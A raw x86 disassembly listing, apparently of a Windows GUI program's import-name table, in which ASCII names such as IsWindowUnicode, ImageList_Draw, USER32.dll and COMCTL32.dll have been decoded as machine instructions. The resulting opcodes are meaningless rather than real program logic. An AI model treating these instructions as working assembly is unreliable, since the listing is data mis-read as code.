  412e1e:	ins    DWORD PTR es:[edi],dx
  412e1f:	add    al,ch
  412e21:	add    DWORD PTR [edi+0x70],ecx
  412e24:	outs   dx,BYTE PTR gs:[esi]
  412e26:	dec    ecx
  412e27:	arpl   WORD PTR [edi+0x6e],bp
  412e2a:	add    BYTE PTR [eax],al
  412e2c:	mov    ds:0x57734901,al
  412e31:	imul   ebp,DWORD PTR [esi+0x64],0x6e55776f
  412e38:	imul   esp,DWORD PTR [ebx+0x6f],0xce006564
  412e3f:	add    DWORD PTR [ebp+0x65],ecx
  412e42:	jae    0x412eb7
  412e44:	popa   
  412e45:	addr16 gs inc edx
  412e48:	outs   dx,DWORD PTR ds:[esi]
  412e49:	js     0x412e8c
  412e4b:	add    BYTE PTR [ebp+0x61724400],dh
  412e51:	ja     0x412ea0
  412e53:	outs   dx,BYTE PTR gs:[esi]
  412e55:	jne    0x412e99
  412e57:	popa   
  412e58:	jb     0x412e5a
  412e5a:	inc    edx
  412e5b:	add    dl,BYTE PTR [ebx+0x65]
  412e5e:	je     0x412ea6
  412e60:	outs   dx,DWORD PTR ds:[esi]
  412e61:	jb     0x412ec8
  412e63:	addr16 jb 0x412ed5
  412e66:	jne    0x412ed6
  412e68:	fs push edi
  412e6a:	imul   ebp,DWORD PTR [esi+0x64],0xc200776f
  412e71:	add    dh,BYTE PTR [edi+0x76]
  412e74:	jae    0x412ee6
  412e76:	jb     0x412ee1
  412e78:	outs   dx,BYTE PTR ds:[esi]
  412e79:	je     0x412ee1
  412e7b:	push   edi
  412e7c:	add    BYTE PTR [eax],al
  412e7e:	mov    al,ds:0x57734901
  412e83:	imul   ebp,DWORD PTR [esi+0x64],0x776f
  412e8a:	push   ebp
  412e8b:	add    DWORD PTR [edi+0x65],eax
  412e8e:	je     0x412ee3
  412e90:	arpl   WORD PTR [edx+0x6f],si
  412e93:	ins    BYTE PTR es:[edi],dx
  412e94:	ins    BYTE PTR es:[edi],dx
  412e95:	push   eax
  412e96:	outs   dx,DWORD PTR ds:[esi]
  412e97:	jae    0x412e99
  412e99:	add    al,dh
  412e9b:	add    BYTE PTR [edi+0x65],al
  412e9e:	je     0x412ee1
  412ea0:	jae    0x412f1b
  412ea2:	outs   dx,BYTE PTR ds:[esi]
  412ea3:	arpl   WORD PTR [ebx+0x65],cx
  412ea6:	jns    0x412efb
  412ea8:	je     0x412f0b
  412eaa:	je     0x412f11
  412eac:	add    BYTE PTR [eax],al
  412eae:	or     eax,0x74654701
  412eb3:	inc    esp
  412eb4:	imul   esp,DWORD PTR [ecx+0x6c],0x6142676f
  412ebb:	jae    0x412f22
  412ebd:	push   ebp
  412ebe:	outs   dx,BYTE PTR ds:[esi]
  412ebf:	imul   esi,DWORD PTR [ebx+esi*2+0x0],0x5502a500
  412ec7:	jo     0x412f2d
  412ec9:	popa   
  412eca:	je     0x412f31
  412ecc:	push   edi
  412ecd:	imul   ebp,DWORD PTR [esi+0x64],0x776f
  412ed4:	or     eax,DWORD PTR [ecx]
  412ed6:	inc    edi
  412ed7:	gs je  0x412f1e
  412eda:	inc    ebx
  412edb:	inc    ebp
  412edc:	js     0x412ede
  412ede:	stos   DWORD PTR es:[edi],eax
  412edf:	add    DWORD PTR [edi+ebp*2+0x61],ecx
  412ee3:	fs inc ebx
  412ee5:	jne    0x412f59
  412ee7:	jae    0x412f58
  412ee9:	jb     0x412f2c
  412eeb:	add    BYTE PTR [edx+eax*1+0x53],bl
  412eef:	gs je  0x412f45
  412ef2:	arpl   WORD PTR [edx+0x6f],si
  412ef5:	ins    BYTE PTR es:[edi],dx
  412ef6:	ins    BYTE PTR es:[edi],dx
  412ef7:	push   edx
  412ef8:	popa   
  412ef9:	outs   dx,BYTE PTR ds:[esi]
  412efa:	add    BYTE PTR gs:[bx+si],al
  412efe:	cmp    DWORD PTR [eax],eax
  412f00:	inc    ebx
  412f01:	push   0x70557261
  412f06:	jo     0x412f6d
  412f08:	jb     0x412f61
  412f0a:	add    BYTE PTR [eax],al
  412f0c:	fwait
  412f0d:	add    dl,BYTE PTR [ebp+0x6e]
  412f10:	ins    BYTE PTR es:[edi],dx
  412f11:	outs   dx,DWORD PTR ds:[esi]
  412f12:	popa   
  412f13:	fs dec ebx
  412f15:	gs jns 0x412f7a
  412f18:	outs   dx,DWORD PTR ds:[esi]
  412f19:	popa   
  412f1a:	jb     0x412f80
  412f1c:	dec    esp
  412f1d:	popa   
  412f1e:	jns    0x412f8f
  412f20:	jne    0x412f96
  412f22:	add    BYTE PTR [eax],al
  412f24:	push   esi
  412f25:	add    DWORD PTR [edi+0x65],eax
  412f28:	je     0x412f7d
  412f2a:	arpl   WORD PTR [edx+0x6f],si
  412f2d:	ins    BYTE PTR es:[edi],dx
  412f2e:	ins    BYTE PTR es:[edi],dx
  412f2f:	push   edx
  412f30:	popa   
  412f31:	outs   dx,BYTE PTR ds:[esi]
  412f32:	add    BYTE PTR gs:[bx+si],al
  412f36:	ins    DWORD PTR es:[edi],dx
  412f37:	add    DWORD PTR [edi+0x65],eax
  412f3a:	je     0x412f93
  412f3c:	imul   ebp,DWORD PTR [esi+0x64],0x6f4c776f
  412f43:	outs   dx,BYTE PTR ds:[esi]
  412f44:	addr16 push edi
  412f46:	add    BYTE PTR [eax],al
  412f48:	add    BYTE PTR [ecx],0x49
  412f4b:	outs   dx,BYTE PTR ds:[esi]
  412f4c:	data16 ins BYTE PTR es:[edi],dx
  412f4e:	popa   
  412f4f:	je     0x412fb6
  412f51:	push   edx
  412f52:	arpl   WORD PTR gs:[eax+eax*1+0x16],si
  412f57:	add    dl,BYTE PTR [edx+0x65]
  412f5a:	ins    DWORD PTR es:[edi],dx
  412f5b:	outs   dx,DWORD PTR ds:[esi]
  412f5c:	jbe    0x412fc3
  412f5e:	dec    ebp
  412f5f:	outs   dx,BYTE PTR gs:[esi]
  412f61:	jne    0x412f63
  412f63:	add    BYTE PTR [ebx+0x61724400],ch
  412f69:	ja     0x412fac
  412f6b:	outs   dx,BYTE PTR ds:[esi]
  412f6c:	imul   ebp,DWORD PTR [ebp+0x61],0x52646574
  412f73:	arpl   WORD PTR gs:[ebx+esi*2+0x0],si
  412f78:	das    
  412f79:	add    dl,BYTE PTR [ebx+0x65]
  412f7c:	je     0x412fbf
  412f7e:	arpl   WORD PTR [ecx+ebp*2+0x76],si
  412f82:	gs push edi
  412f84:	imul   ebp,DWORD PTR [esi+0x64],0x9c00776f
  412f8b:	add    BYTE PTR [ecx+ebp*2+0x61],al
  412f8f:	ins    BYTE PTR es:[edi],dx
  412f90:	outs   dx,DWORD PTR ds:[esi]
  412f91:	addr16 inc edx
  412f93:	outs   dx,DWORD PTR ds:[esi]
  412f94:	js     0x412fe6
  412f96:	popa   
  412f97:	jb     0x412ffa
  412f99:	ins    DWORD PTR es:[edi],dx
  412f9a:	inc    ecx
  412f9b:	add    bh,ah
  412f9d:	add    BYTE PTR [esi+0x72],al
  412fa0:	popa   
  412fa1:	ins    DWORD PTR es:[edi],dx
  412fa2:	gs push edx
  412fa4:	arpl   WORD PTR gs:[eax+eax*1-0x68],si
  412fa9:	add    DWORD PTR [ecx+0x73],ecx
  412fac:	inc    esp
  412fad:	imul   esp,DWORD PTR [ecx+0x6c],0x654d676f
  412fb4:	jae    0x413029
  412fb6:	popa   
  412fb7:	addr16 gs push edi
  412fba:	add    BYTE PTR [eax],al
  412fbc:	xor    DWORD PTR [eax],eax
  412fbe:	inc    ebx
  412fbf:	push   0x72507261
  412fc4:	gs jbe 0x41301e
  412fc7:	add    BYTE PTR ds:0x74654701,dl
  412fcd:	inc    esi
  412fce:	outs   dx,DWORD PTR ds:[esi]
  412fcf:	jb     0x413036
  412fd1:	addr16 jb 0x413043
  412fd4:	jne    0x413044
  412fd6:	fs push edi
  412fd8:	imul   ebp,DWORD PTR [esi+0x64],0xb700776f
  412fdf:	add    dl,BYTE PTR [edi+0x61]
  412fe2:	imul   esi,DWORD PTR [esi+eax*2+0x6f],0x706e4972
  412fea:	jne    0x413060
  412fec:	dec    ecx
  412fed:	fs ins BYTE PTR es:[edi],dx
  412fef:	add    BYTE PTR gs:[eax],al
  412ff2:	push   edi
  412ff3:	add    dl,BYTE PTR [ebx+0x65]
  412ff6:	je     0x413048
  412ff8:	jb     0x413069
  412ffa:	jo     0x413053
  412ffc:	add    BYTE PTR [eax],al
  412ffe:	dec    eax
  412fff:	add    dl,BYTE PTR [ebx+0x65]
  413002:	je     0x413051
  413004:	outs   dx,BYTE PTR gs:[esi]
  413006:	jne    0x413008
  413008:	scas   al,BYTE PTR es:[edi]
  413009:	add    DWORD PTR [edi+ebp*2+0x61],ecx
  41300d:	fs inc ebx
  41300f:	jne    0x413083
  413011:	jae    0x413082
  413013:	jb     0x41306c
  413015:	add    BYTE PTR [edi+0x2],bl
  413018:	push   ebx
  413019:	gs je  0x41306f
  41301c:	jns    0x413091
  41301e:	inc    ebx
  41301f:	outs   dx,DWORD PTR ds:[esi]
  413020:	ins    BYTE PTR es:[edi],dx
  413021:	outs   dx,DWORD PTR ds:[esi]
  413022:	jb     0x413097
  413024:	add    BYTE PTR [eax],al
  413026:	xchg   esp,eax
  413027:	add    dl,BYTE PTR [edx+esi*2+0x61]
  41302b:	outs   dx,BYTE PTR ds:[esi]
  41302c:	jae    0x41309a
  41302e:	popa   
  41302f:	je     0x413096
  413031:	inc    ecx
  413032:	arpl   WORD PTR [ebx+0x65],sp
  413035:	ins    BYTE PTR es:[edi],dx
  413036:	gs jb  0x41309a
  413039:	je     0x4130aa
  41303b:	jb     0x413094
  41303d:	add    BYTE PTR [edi+0x66654400],cl
  413043:	push   edi
  413044:	imul   ebp,DWORD PTR [esi+0x64],0x7250776f
  41304b:	outs   dx,DWORD PTR ds:[esi]
  41304c:	arpl   WORD PTR [edi+0x0],dx
  41304f:	add    BYTE PTR [ecx+0x0],ah
  413052:	inc    ebx
  413053:	jb     0x4130ba
  413055:	popa   
  413056:	je     0x4130bd
  413058:	push   eax
  413059:	outs   dx,DWORD PTR ds:[esi]
  41305a:	jo     0x4130d1
  41305c:	jo     0x4130ab
  41305e:	outs   dx,BYTE PTR gs:[esi]
  413060:	jne    0x413062
  413062:	push   ecx
  413063:	add    dl,BYTE PTR [ebx+0x65]
  413066:	je     0x4130b8
  413068:	popa   
  413069:	jb     0x4130d0
  41306b:	outs   dx,BYTE PTR ds:[esi]
  41306c:	je     0x41306e
  41306e:	popf   
  41306f:	add    BYTE PTR [ecx+ebp*2+0x61],al
  413073:	ins    BYTE PTR es:[edi],dx
  413074:	outs   dx,DWORD PTR ds:[esi]
  413075:	addr16 inc edx
  413077:	outs   dx,DWORD PTR ds:[esi]
  413078:	js     0x4130ca
  41307a:	popa   
  41307b:	jb     0x4130de
  41307d:	ins    DWORD PTR es:[edi],dx
  41307e:	push   edi
  41307f:	add    BYTE PTR [edx+0x6c695402],cl
  413085:	gs push edi
  413087:	imul   ebp,DWORD PTR [esi+0x64],0x73776f
  41308e:	sub    DWORD PTR [eax],eax
  413090:	inc    ebx
  413091:	push   0x6f4c7261
  413096:	ja     0x4130fd
  413098:	jb     0x4130f1
  41309a:	add    BYTE PTR [eax],al
  41309c:	out    dx,eax
  41309d:	add    DWORD PTR [eax+0x65],edx
  4130a0:	imul   ecx,DWORD PTR gs:[ebp+0x65],0x73
  4130a5:	jae    0x413108
  4130a7:	addr16 gs push edi
  4130aa:	add    BYTE PTR [eax],al
  4130ac:	jne    0x4130af
  4130ae:	inc    edi
  4130af:	gs je  0x413109
  4130b2:	imul   ebp,DWORD PTR [esi+0x64],0x6554776f
  4130b9:	js     0x41312f
  4130bb:	inc    ecx
  4130bc:	add    BYTE PTR [eax],al
  4130be:	add    DWORD PTR ds:[edi+0x65],eax
  4130c2:	je     0x413111
  4130c4:	gs jae 0x41313a
  4130c7:	popa   
  4130c8:	addr16 gs push edi
  4130cb:	add    BYTE PTR ds:0x61684300,ch
  4130d1:	jb     0x413121
  4130d3:	gs js  0x41314a
  4130d6:	push   edi
  4130d7:	add    BYTE PTR [ecx+eax*1+0x64616f4c],bh
  4130de:	push   ebx
  4130df:	je     0x413153
  4130e1:	imul   ebp,DWORD PTR [esi+0x67],0x2800057
  4130e8:	push   ebx
  4130e9:	push   0x6957776f
  4130ee:	outs   dx,BYTE PTR ds:[esi]
  4130ef:	outs   dx,DWORD PTR fs:[esi]
  4130f1:	ja     0x413134
  4130f3:	jae    0x41316e
  4130f5:	outs   dx,BYTE PTR ds:[esi]
  4130f6:	arpl   WORD PTR [eax],ax
  4130f8:	add    BYTE PTR ss:[ebx+0x68],al
  4130fc:	popa   
  4130fd:	jb     0x413154
  4130ff:	jo     0x413171
  413101:	gs jb  0x413145
  413104:	add    BYTE PTR [eax],al
  413106:	sti    
  413107:	add    DWORD PTR [eax+0x74],edx
  41310a:	dec    ecx
  41310b:	outs   dx,BYTE PTR ds:[esi]
  41310c:	push   edx
  41310d:	arpl   WORD PTR gs:[eax+eax*1+0x0],si
  413112:	sbb    eax,DWORD PTR [eax]
  413114:	inc    ebx
  413115:	popa   
  413116:	ins    BYTE PTR es:[edi],dx
  413117:	ins    BYTE PTR es:[edi],dx
  413118:	push   edi
  413119:	imul   ebp,DWORD PTR [esi+0x64],0x7250776f
  413120:	outs   dx,DWORD PTR ds:[esi]
  413121:	arpl   WORD PTR [edi+0x0],dx
  413124:	lahf   
  413125:	add    BYTE PTR [ecx+ebp*2+0x73],al
  413129:	jo     0x41318c
  41312b:	je     0x413190
  41312d:	push   0x7373654d
  413132:	popa   
  413133:	addr16 gs inc ecx
  413136:	add    BYTE PTR [eax],al
  413138:	mov    BYTE PTR [edx],al
  41313a:	push   esp
  41313b:	popa   
  41313c:	bound  esp,QWORD PTR [edx+0x65]
  41313f:	fs push esp
  413141:	gs js  0x4131b8
  413144:	dec    edi
  413145:	jne    0x4131bb
  413147:	push   edi
  413148:	add    BYTE PTR [eax],al
  41314a:	sub    eax,DWORD PTR [edx]
  41314c:	push   ebx
  41314d:	outs   dx,BYTE PTR gs:[esi]
  41314f:	fs dec ebp
  413151:	gs jae 0x4131c7
  413154:	popa   
  413155:	addr16 gs push edi
  413158:	add    BYTE PTR [eax],al
  41315a:	add    DWORD PTR fs:[edi+0x65],eax
  41315e:	je     0x4131b5
  413160:	jo     0x4131c6
  413162:	popa   
  413163:	je     0x4131ca
  413165:	push   edx
  413166:	outs   dx,BYTE PTR ds:[si]
  413168:	add    BYTE PTR [eax],al
  41316a:	mov    eax,0x61724400
  41316f:	ja     0x4131c4
  413171:	je     0x4131d4
  413173:	je     0x4131da
  413175:	push   edi
  413176:	add    BYTE PTR [eax],al
  413178:	sub    eax,0x74654701
  41317d:	dec    ebp
  41317e:	outs   dx,BYTE PTR gs:[esi]
  413180:	jne    0x4131c5
  413182:	push   0x4d6b6365
  413187:	popa   
  413188:	jb     0x4131f5
  41318a:	inc    esp
  41318b:	imul   ebp,DWORD PTR [ebp+0x65],0x6f69736e
  413192:	outs   dx,BYTE PTR ds:[esi]
  413193:	jae    0x413195
  413195:	add    BYTE PTR [ebx+0x616f4c01],bh
  41319b:	fs push ebx
  41319d:	je     0x413211
  41319f:	imul   ebp,DWORD PTR [esi+0x67],0x2590041
  4131a6:	push   ebx
  4131a7:	gs je  0x4131fc
  4131aa:	arpl   WORD PTR gs:[ebp+eax*2+0x6d],si
  4131af:	jo     0x413225
  4131b1:	jns    0x4131b3
  4131b3:	add    BYTE PTR [edi+0x0],dl
  4131b6:	inc    ebx
  4131b7:	jb     0x41321e
  4131b9:	popa   
  4131ba:	je     0x413221
  4131bc:	inc    esp
  4131bd:	imul   esp,DWORD PTR [ecx+0x6c],0x6e49676f
  4131c4:	imul   esi,DWORD PTR fs:[edx+0x65],0x61507463
  4131cc:	jb     0x41322f
  4131ce:	ins    DWORD PTR es:[edi],dx
  4131cf:	push   edi
  4131d0:	add    BYTE PTR [eax],al
  4131d2:	cmp    BYTE PTR [eax],al
  4131d4:	inc    ebx
  4131d5:	push   0x70557261
  4131da:	jo     0x413241
  4131dc:	jb     0x413220
  4131de:	jne    0x413246
  4131e0:	push   di
  4131e2:	add    BYTE PTR [eax],al
  4131e4:	ja     0x4131e7
  4131e6:	inc    edi
  4131e7:	gs je  0x413241
  4131ea:	imul   ebp,DWORD PTR [esi+0x64],0x6554776f
  4131f1:	js     0x413267
  4131f3:	dec    esp
  4131f4:	outs   dx,BYTE PTR gs:[esi]
  4131f6:	addr16 je 0x413261
  4131f9:	push   edi
  4131fa:	add    BYTE PTR [eax],al
  4131fc:	xor    eax,0x61684300
  413201:	jb     0x413257
  413203:	outs   dx,DWORD PTR ds:[esi]
  413204:	dec    edi
  413205:	gs ins DWORD PTR es:[edi],dx
  413207:	push   edi
  413208:	add    BYTE PTR [eax],al
  41320a:	dec    edx
  41320b:	add    dl,BYTE PTR [ebx+0x65]
  41320e:	je     0x41325d
  413210:	outs   dx,BYTE PTR gs:[esi]
  413212:	jne    0x413258
  413214:	gs popaw 
  413217:	jne    0x413285
  413219:	je     0x413264
  41321b:	je     0x413282
  41321d:	ins    DWORD PTR es:[edi],dx
  41321e:	add    BYTE PTR [eax],al
  413220:	push   ebp
  413221:	push   ebx
  413222:	inc    ebp
  413223:	push   edx
  413224:	xor    esi,DWORD PTR [edx]
  413226:	cs fs ins BYTE PTR es:[edi],dx
  413229:	ins    BYTE PTR es:[edi],dx
  41322a:	add    BYTE PTR [eax],al
  41322c:	push   ebx
  41322d:	add    BYTE PTR [ecx+0x6d],cl
  413230:	popa   
  413231:	addr16 gs dec esp
  413234:	imul   esi,DWORD PTR [ebx+0x74],0x7465535f
  41323b:	dec    ecx
  41323c:	arpl   WORD PTR [edi+0x6e],bp
  41323f:	push   ebx
  413240:	imul   edi,DWORD PTR [edx+0x65],0x49005600
  413247:	ins    DWORD PTR es:[edi],dx
  413248:	popa   
  413249:	addr16 gs dec esp
  41324c:	imul   esi,DWORD PTR [ebx+0x74],0x6972575f
  413253:	je     0x4132ba
  413255:	add    BYTE PTR [esi+0x0],cl
  413258:	dec    ecx
  413259:	ins    DWORD PTR es:[edi],dx
  41325a:	popa   
  41325b:	addr16 gs dec esp
  41325e:	imul   esi,DWORD PTR [ebx+0x74],0x7065525f
  413265:	ins    BYTE PTR es:[edi],dx
  413266:	popa   
  413267:	arpl   WORD PTR [ebp+0x49],sp
  41326a:	arpl   WORD PTR [edi+0x6e],bp
  41326d:	add    BYTE PTR [esi],dh
  41326f:	add    BYTE PTR [ecx+0x6d],cl
  413272:	popa   
  413273:	addr16 gs dec esp
  413276:	imul   esi,DWORD PTR [ebx+0x74],0x6172445f
  41327d:	ja     0x41327f
  41327f:	add    BYTE PTR [ebx],dl
  413281:	add    BYTE PTR [ebx+0x72],al
  413284:	gs popa 
  413286:	je     0x4132ed
  413288:	push   eax
  413289:	jb     0x4132fa
  41328b:	jo     0x4132f2
  41328d:	jb     0x413303
  41328f:	jns    0x4132e4
  413291:	push   0x50746565
  413296:	popa   
  413297:	addr16 gs push edi
  41329a:	add    BYTE PTR [eax],al
  41329c:	pop    esp
  41329d:	add    BYTE PTR [eax+0x72],dl
  4132a0:	outs   dx,DWORD PTR ds:[esi]
  4132a1:	jo     0x413308
  4132a3:	jb     0x413319
  4132a5:	jns    0x4132fa
  4132a7:	push   0x57746565
  4132ac:	add    BYTE PTR [eax],al
  4132ae:	inc    ebx
  4132af:	dec    edi
  4132b0:	dec    ebp
  4132b1:	inc    ebx
  4132b2:	push   esp
  4132b3:	dec    esp
  4132b4:	xor    esi,DWORD PTR [edx]
  4132b6:	cs fs ins BYTE PTR es:[edi],dx
  4132b9:	ins    BYTE PTR es:[edi],dx
  4132ba:	add    BYTE PTR [eax],al
  4132bc:	mov    WORD PTR [eax],es
  4132be:	inc    ebx
  4132bf:	jb     0x413326
  4132c1:	popa   
  4132c2:	je     0x413329
  4132c4:	inc    ebx
  4132c5:	outs   dx,DWORD PTR ds:[esi]
  4132c6:	ins    DWORD PTR es:[edi],dx
  4132c7:	jo     0x41332a
  4132c9:	je     0x413334
  4132cb:	bound  ebp,QWORD PTR [ebp+eiz*2+0x42]
  4132cf:	imul   esi,DWORD PTR [ebp+ebp*2+0x61],0xa5000070
  4132d7:	add    BYTE PTR [ebx+0x72],al
  4132da:	gs popa 
  4132dc:	je     0x413343
  4132de:	push   eax
  4132df:	popa   
  4132e0:	ins    BYTE PTR es:[edi],dx
  4132e1:	gs je  0x413358
  4132e4:	add    BYTE PTR gs:[ebx+0x746e4901],dl
  4132eb:	gs jb  0x413361
  4132ee:	arpl   WORD PTR gs:[ebx+eax*2+0x6c],si
  4132f3:	imul   esi,DWORD PTR [eax+0x52],0x746365
  4132fa:	into   
  4132fb:	add    DWORD PTR [ebx+0x65],edx
  4132fe:	ins    BYTE PTR es:[edi],dx
  4132ff:	arpl   WORD PTR gs:[edi+ecx*2+0x62],si
  413304:	push   0x65
  413306:	arpl   WORD PTR [eax+eax*1+0x0],si
  41330a:	jp     0x41330d
  41330c:	inc    edi
  41330d:	gs je  0x413363
  413310:	jns    0x413385
  413312:	je     0x413379
  413314:	ins    DWORD PTR es:[edi],dx
  413315:	push   eax
  413316:	popa   
  413317:	ins    BYTE PTR es:[edi],dx
  413318:	gs je  0x41338f
  41331b:	gs push ebp
  41331d:	jae    0x413384
  41331f:	add    BYTE PTR [ecx+0x65724300],cl
  413325:	popa   
  413326:	je     0x41338d
  413328:	inc    edx
  413329:	jb     0x4133a0
  41332b:	jae    0x413395
  41332d:	dec    ecx
  41332e:	outs   dx,BYTE PTR ds:[esi]
  41332f:	imul   esi,DWORD PTR fs:[edx+0x65],0xe8007463
  413337:	add    DWORD PTR [ebx+0x65],edx
  41333a:	je     0x413389
  41333c:	popa   
  41333d:	jo     0x41338c
  41333f:	outs   dx,DWORD PTR ds:[esi]
  413340:	fs add BYTE PTR gs:[eax],al
  413344:	pop    esp
  413345:	add    DWORD PTR [edi+0x65],eax
  413348:	je     0x413396
  41334a:	popa   
  41334b:	jns    0x4133bc
  41334d:	jne    0x4133c3
  41334f:	add    bh,ch
  413351:	add    DWORD PTR [ebx+0x65],edx
  413354:	je     0x4133a6
  413356:	imul   edi,DWORD PTR [eax+0x65],0xc700006c
  41335d:	add    DWORD PTR [ebx+0x61],edx
  413360:	jbe    0x4133c7
  413362:	inc    esp
  413363:	inc    ebx
  413364:	add    BYTE PTR [eax],al
  413366:	pop    edi
  413367:	add    DWORD PTR [edi+0x65],eax
  41336a:	je     0x4133b9
  41336c:	popa   
  41336d:	jo     0x4133bc
  41336f:	outs   dx,DWORD PTR ds:[esi]
  413370:	fs add BYTE PTR gs:[eax],al
  413374:	mov    ds:0x65724300,al
  413379:	popa   
  41337a:	je     0x4133e1
  41337c:	dec    ecx
  41337d:	inc    ebx
  41337e:	push   edi
  41337f:	add    BYTE PTR [esi+0x65724300],dl
  413385:	popa   
  413386:	je     0x4133ed
  413388:	inc    ebp
  413389:	ins    BYTE PTR es:[edi],dx
  41338a:	ins    BYTE PTR es:[edi],dx
  41338b:	imul   esi,DWORD PTR [eax+0x74],0x67526369
  413392:	outs   dx,BYTE PTR ds:[esi]
  413393:	dec    ecx
  413394:	outs   dx,BYTE PTR ds:[esi]
  413395:	imul   esi,DWORD PTR fs:[edx+0x65],0x99007463
  41339d:	add    BYTE PTR [ebx+0x72],al
  4133a0:	gs popa 
  4133a2:	je     0x413409
  4133a4:	inc    esi
  4133a5:	outs   dx,DWORD PTR ds:[esi]
  4133a6:	outs   dx,BYTE PTR ds:[esi]
  4133a7:	je     0x4133ea
  4133a9:	add    BYTE PTR ds:0x61725402,cl
  4133af:	outs   dx,BYTE PTR ds:[esi]
  4133b0:	jae    0x41341e
  4133b2:	popa   
  4133b3:	je     0x41341a
  4133b5:	inc    ebx
  4133b6:	push   0x65737261
  4133bb:	je     0x413406
  4133bd:	outs   dx,BYTE PTR ds:[esi]
  4133be:	outs   dx,WORD PTR ds:[esi]
  4133c0:	add    BYTE PTR [eax],al
  4133c2:	out    dx,al
  4133c3:	add    DWORD PTR [ebx+0x65],edx
  4133c6:	je     0x413418
  4133c8:	popa   
  4133c9:	ins    BYTE PTR es:[edi],dx
  4133ca:	gs je  0x413441
  4133cd:	gs inc ebp
  4133cf:	outs   dx,BYTE PTR ds:[esi]
  4133d0:	je     0x413444
  4133d2:	imul   esp,DWORD PTR [ebp+0x73],0x5301d300
  4133d9:	gs je  0x41341e
  4133dc:	imul   esi,DWORD PTR [ebp+ebp*2+0x61],0x6d694470
  4133e4:	outs   dx,BYTE PTR gs:[esi]
  4133e6:	jae    0x413451
  4133e8:	outs   dx,DWORD PTR ds:[esi]
  4133e9:	outs   dx,BYTE PTR ds:[esi]
  4133ea:	inc    ebp
  4133eb:	js     0x4133ed
  4133ed:	add    BYTE PTR [esi],al
  4133ef:	add    dl,BYTE PTR [ebx+0x74]
  4133f2:	jb     0x413459
  4133f4:	je     0x413459
  4133f6:	push   0x746c42
  4133fb:	add    BYTE PTR [eax+eax*1+0x61657243],dl
  413402:	je     0x413469
  413404:	inc    esp
  413405:	imul   esi,DWORD PTR [ebx+0x63],0x61647261
  41340c:	bound  ebp,QWORD PTR [ebp+eiz*2+0x42]
  413410:	imul   esi,DWORD PTR [ebp+ebp*2+0x61],0x13f0070
  413418:	inc    edi
  413419:	gs je  0x413460
  41341c:	dec    ecx
  41341d:	inc    edx
  41341e:	inc    ebx
  41341f:	outs   dx,DWORD PTR ds:[esi]
  413420:	ins    BYTE PTR es:[edi],dx
  413421:	outs   dx,DWORD PTR ds:[esi]
  413422:	jb     0x413478
  413424:	popa   
  413425:	bound  ebp,QWORD PTR [ebp+eiz*2+0x0]
  413429:	add    BYTE PTR [edi+0x6e694c01],dl
  41342f:	gs push esp
  413431:	outs   dx,DWORD PTR ds:[esi]
  413432:	add    BYTE PTR [eax],al
  413434:	clc    
  413435:	add    DWORD PTR [ebx+0x65],edx
  413438:	je     0x41348e
  41343a:	gs js  0x4134b1
  41343d:	inc    ecx
  41343e:	ins    BYTE PTR es:[edi],dx
  41343f:	imul   esp,DWORD PTR [edi+0x6e],0x1a40000
  413446:	push   eax
  413447:	popa   
  413448:	je     0x41348c
  41344a:	ins    BYTE PTR es:[edi],dx
  41344b:	je     0x41344d
  41344d:	add    BYTE PTR [ebp+0x0],dh
  413450:	inc    edx
  413451:	imul   ebp,DWORD PTR gs:[bp+0x50],0x687461
  41345a:	test   al,0x0
  41345c:	inc    ebx
  41345d:	jb     0x4134c4
  41345f:	popa   
  413460:	je     0x4134c7
  413462:	push   eax
  413463:	outs   dx,BYTE PTR gs:[esi]
  413465:	dec    ecx
  413466:	outs   dx,BYTE PTR ds:[esi]
  413467:	imul   esi,DWORD PTR fs:[edx+0x65],0x83007463
  41346f:	add    DWORD PTR [edi+0x65],eax
  413472:	je     0x4134c8
  413474:	gs js  0x4134eb
  413477:	inc    ebp
  413478:	js     0x4134ee
  41347a:	outs   dx,BYTE PTR gs:[esi]
  41347c:	je     0x4134ce
  41347e:	outs   dx,DWORD PTR ds:[esi]
  41347f:	imul   ebp,DWORD PTR [esi+0x74],0x413233
  413486:	aam    0x1
  413488:	push   ebx
  413489:	gs je  0x4134ce
  41348c:	imul   eax,DWORD PTR [ebx+0x6f],0x6c
  413490:	outs   dx,DWORD PTR ds:[esi]
  413491:	jb     0x413493
  413493:	add    bl,dh
  413495:	add    DWORD PTR [ebx+0x65],edx
  413498:	je     0x4134ec
  41349a:	dec    edi
  41349b:	push   eax
  41349c:	xor    al,BYTE PTR [eax]
  41349e:	stos   BYTE PTR es:[edi],al
  41349f:	add    BYTE PTR [ebx+0x72],al
  4134a2:	gs popa 
  4134a4:	je     0x41350b
  4134a6:	push   eax
  4134a7:	outs   dx,DWORD PTR ds:[esi]
  4134a8:	ins    BYTE PTR es:[edi],dx
  4134a9:	jns    0x413512
  4134ab:	outs   dx,DWORD PTR ds:[esi]
  4134ac:	outs   dx,BYTE PTR ds:[esi]
  4134ad:	push   edx
  4134ae:	outs   dx,BYTE PTR ds:[si]
  4134b0:	add    BYTE PTR [eax],al
  4134b2:	xchg   DWORD PTR [ecx],eax
  4134b4:	inc    edi
  4134b5:	gs je  0x41350c
  4134b8:	gs js  0x41352f
  4134bb:	inc    ebp
  4134bc:	js     0x413532
  4134be:	outs   dx,BYTE PTR gs:[esi]
  4134c0:	je     0x413512
  4134c2:	outs   dx,DWORD PTR ds:[esi]
  4134c3:	imul   ebp,DWORD PTR [esi+0x74],0x2010057
  4134ca:	push   ebx
  4134cb:	gs je  0x413525
  4134ce:	imul   ebp,DWORD PTR [esi+0x64],0x724f776f
  4134d5:	addr16 inc ebp
  4134d7:	js     0x4134d9
  4134d9:	add    BYTE PTR [edi+0x65724300],ah
  4134df:	popa   
  4134e0:	je     0x413547
  4134e2:	push   eax
  4134e3:	outs   dx,BYTE PTR gs:[esi]
  4134e5:	add    BYTE PTR [esi+0x74654701],cl
  4134eb:	push   esi
  4134ec:	imul   esp,DWORD PTR [ebp+0x77],0x74726f70
  4134f3:	dec    edi
  4134f4:	jb     0x41355d
  4134f6:	inc    ebp
  4134f7:	js     0x4134f9
  4134f9:	add    ch,cl
  4134fb:	add    BYTE PTR [ebp+0x73],al
  4134fe:	arpl   WORD PTR [ecx+0x70],sp
  413501:	add    BYTE PTR gs:[eax],al
  413504:	mov    bl,0x1
  413506:	push   eax
  413507:	outs   dx,DWORD PTR ds:[esi]
  413508:	ins    BYTE PTR es:[edi],dx
  413509:	jns    0x413572
  41350b:	outs   dx,DWORD PTR ds:[esi]
  41350c:	outs   dx,BYTE PTR ds:[esi]
  41350d:	add    BYTE PTR [ebx+0x65724300],ch
  413513:	popa   
  413514:	je     0x41357b
  413516:	push   edx
